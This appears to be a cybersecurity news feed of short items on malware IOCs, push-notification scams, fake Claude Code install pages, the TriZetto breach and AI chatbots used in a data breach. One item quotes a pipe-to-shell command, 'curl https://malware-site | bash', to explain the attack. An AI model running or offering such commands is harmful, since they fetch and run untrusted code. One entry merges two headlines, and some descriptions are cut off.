channel.title: ThreatDigest Hub - Curated Cyber Incidents
channel.description: A curated list of recent cyber incidents, attacks, and security threats.

item.title: [DARK WEB] ThreatFox: ClearFake — 10 new IOCs detected
item.description:
ThreatFox Database
Indicators of Compromise (IOCs) on ThreatFox are associated with a certain malware fas. A malware sample can be associated with only one malware family. The page below gives you an overview on indicators of compromise associated with clearfake .

item.title: [DARK WEB] ThreatFox: StrelaStealer — 10 new IOCs detected
item.description:
ThreatFox Database
Indicators of Compromise (IOCs) on ThreatFox are associated with a certain malware fas. A malware sample can be associated with only one malware family. The page below gives you an overview on indicators of compromise associated with strelastealer .

item.title: AI Security Startups Dominate New Cyber Innovation Awards
item.description: US-based cybersecurity industry analyst firm IT-Harvest has announced the second cohort of its Cyber 150 awards – and 22% of winners are offering AI security products. Cyber 150 is IT-Harvest’s annual list of the fastest-growing mid-size cybersecurity companies worldwide. Introduced in January 2025, this prize awards emerging security vendors that are scaling rapidly and shaping the next generation of cybersecurity technology.

item.title: Quiz sites trick users into enabling unwanted browser notifications
item.description: Our support team flagged a number of customers who suspected their device might be infected with malware, but Malwarebytes scans came up empty. When the customers provided screenshots, our Malware Removal Support team quickly recognized the format as web push notifications. The reason the scans came up clean is that these notifications aren’t malware on the device.

item.title: Fake Claude Code install pages hit Windows and Mac users with infostealers
item.description: Attackers are cloning install pages for popular tools like Claude Code and swapping the “one‑liner” install commands with malware, mainly to steal passwords, cookies, sessions, and access to developer environments. Modern install guides often tell you to copy a single command like curl https://malware-site | bash into your terminal and hit Enter.​ That habit turns the website into a remote control: whatever script lives at that URL runs with your permissions, often those of an administrator. ...

item.title: Ukraine’s cybersecurity lessons: How warzone innovation protects the world
TriZetto data breach: health tech giant reveals personal info of 3.4 million users may have been affected
item.description:
TriZetto breach exposed data of 3.4 million people
Attackers siphoned sensitive patient and insurance records for nearly a year
Company offering identity monitoring services after discover
The TriZetto data breach may have been going on for almost a year, and affected around 3.4 million people, it has admitted. The company filed a new data breach notification with the Office of the Maine Attorney General and started notifying affected individuals about the incident, noting it spotted “susp...

item.title: AI Chatbots Weaponized in Massive Mexican Government Data Breach
